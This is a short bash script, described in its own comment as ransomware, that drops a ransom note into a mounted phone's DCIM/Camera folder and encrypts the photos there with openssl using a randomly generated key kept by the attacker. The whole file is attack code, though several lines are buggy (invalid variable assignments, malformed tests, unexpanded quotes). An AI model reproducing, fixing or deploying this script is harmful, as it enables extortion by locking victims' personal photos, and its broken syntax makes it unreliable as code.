#!/bin/bash
#This script encrypts photos found in the DCIM folder, as well as leaves behind a nasty ransom letter...

PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*) #TODO escape spaces somehow
LOCALPATH=$(echo ~/Desktop/phone-nab)
echo $PHONEPATH
pwd

#drop ransom note
ransomid=$(openssl rand 16 -hex)
cp "$LOCALPATH/media/ransomnote.png" "$PHONEPATH/DCIM/Camera/ransom_$ransomid.png"

#encrypt files. REMINDER: don't encrypt the note
enc_key=$(openssl rand 16 -hex)
$filecount=$('ls -1 | wc -l')
$currentfile=1
for f in $PHONEPATH/DCIM/Camera/*
do 
	echo '$f ($currentfile/$filecount) encrypting...'
	[-f $f] && [ $f -ne ransom_$ransomid.png] && openssl aes-256-cbc -a -salt -in $f -out $f.lol -k $enc_key
	$currentfile=$(($currentfile+1))
done

echo $ransomid $enc_key > $LOCALPATH/keys/keys.txt

	
